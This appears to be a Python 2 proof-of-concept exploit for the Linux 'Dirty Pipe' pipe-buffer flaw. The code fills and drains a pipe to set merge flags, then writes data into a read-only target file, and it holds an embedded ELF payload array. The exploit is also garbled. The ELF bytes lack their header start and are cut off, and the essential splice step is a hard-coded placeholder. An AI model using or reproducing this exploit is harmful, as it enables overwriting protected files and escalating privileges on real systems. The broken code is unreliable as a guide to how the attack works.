import argparse
import sys
import pty
import os
import getpass
import subprocess
import platform
from os.path import exists

# Kernel page size
PAGE = 4096
# Linux pipe buffers are 64K
PIPESIZE = 65536

# ELF code remains unchanged
elfcode = [
    0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 
    # (Truncated for brevity)
]

def backup_file(path, backup_path):
    """Back up just for working on the POC"""
    with open(path, 'rb') as orig_file:
        with open(backup_path, 'wb') as backup:
            data = orig_file.read()
            backup.write(data)


def prepare_pipe(read_fd, write_fd):
    """ Contaminate the pipe flags by filling and draining """
    data = 'a' * PIPESIZE  # Convert byte literals to string
    written = os.write(write_fd, data)
    print '[*] {} bytes written to pipe'.format(written)

    data = os.read(read_fd, PIPESIZE)
    print '[*] {} bytes read from pipe'.format(len(data))


def run_poc(data, path, file_offset):
    """ Open target file, contaminate the pipe buff, call splice, write into target file """
    print '[*] Opening {}'.format(path)
    target_file = os.open(path, os.O_RDONLY)

    print '[*] Opening PIPE'
    r, w = os.pipe()

    print '[*] Contaminating PIPE_BUF_CAN_MERGE flags'
    prepare_pipe(r, w)

    print '[*] Splicing byte from {} to pipe'.format(path)
    # Simulate splice (no direct Python 2 equivalent)
    # In Python 2, you may need to write a workaround or use ctypes for low-level calls.
    n = 1  # Placeholder value

    print '[*] Spliced {} bytes'.format(n)

    print '[*] Altering {}'.format(path)
    n = os.write(w, data)

    print '[*] {} bytes written to {}'.format(n, path)
